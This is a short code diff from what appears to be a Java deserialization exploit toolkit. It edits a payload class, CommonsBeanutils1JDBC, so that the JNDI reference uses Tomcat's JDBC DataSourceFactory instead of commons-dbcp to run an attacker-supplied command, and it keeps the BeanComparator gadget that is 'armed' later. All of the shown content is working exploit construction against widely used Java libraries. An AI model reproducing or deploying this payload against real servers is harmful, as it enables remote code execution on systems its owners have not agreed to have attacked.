@@ -24,7 +24,8 @@ public class CommonsBeanutils1JDBC implements ObjectPayload<Object> {
         //org.apache.commons.dbcp2.BasicDataSourceFactory
         //org.apache.commons.dbcp.BasicDataSourceFactory
         //com.alibaba.druid.pool.DruidDataSourceFactory
-        Reference ref = dbcpByFactory("org.apache.commons.dbcp.BasicDataSourceFactory", command);
+        //org.apache.tomcat.jdbc.pool.DataSourceFactory
+        Reference ref = dbcpByFactory("org.apache.tomcat.jdbc.pool.DataSourceFactory", command);
 
         // mock method name until armed
         final BeanComparator comparator = new BeanComparator("lowestSetBit");
